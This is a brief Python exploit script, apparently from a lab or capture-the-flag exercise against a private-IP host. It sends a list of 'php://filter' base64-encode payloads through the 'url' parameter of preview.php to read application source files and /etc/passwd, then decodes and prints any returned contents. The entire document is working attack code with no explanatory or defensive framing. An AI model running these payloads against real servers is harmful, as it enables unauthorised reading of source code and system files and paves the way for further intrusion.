import requests, urllib.parse, base64

base = 'http://10.82.159.192/preview.php?url='

payloads = [
    'php://filter/read=convert.base64-encode/resource=/var/www/html/preview.php',
    'php://filter/read=convert.base64-encode/resource=preview.php',
    'php://filter/read=convert.base64-encode/resource=/var/www/html/index.php',
    'php://filter/read=convert.base64-encode/resource=/etc/passwd',
    'php://filter/convert.base64-encode/resource=/var/www/html/preview.php',
    'php://filter/convert.base64-encode/resource=index.php',
]

for p in payloads:
    r = requests.get(base + urllib.parse.quote(p, safe=''), timeout=8)
    body = r.text.strip()
    if body and 'blocked' not in body.lower() and '<title>404' not in body:
        try:
            dec = base64.b64decode(body).decode('utf-8', errors='replace')
            print(f'[HIT] {p}')
            print(dec[:500])
            print('---')
        except Exception:
            print(f'[RAW] {p[:60]}: {body[:200]}')
    else:
        print(f'[BLOCK/EMPTY] {p[:70]}: {body[:60]}')
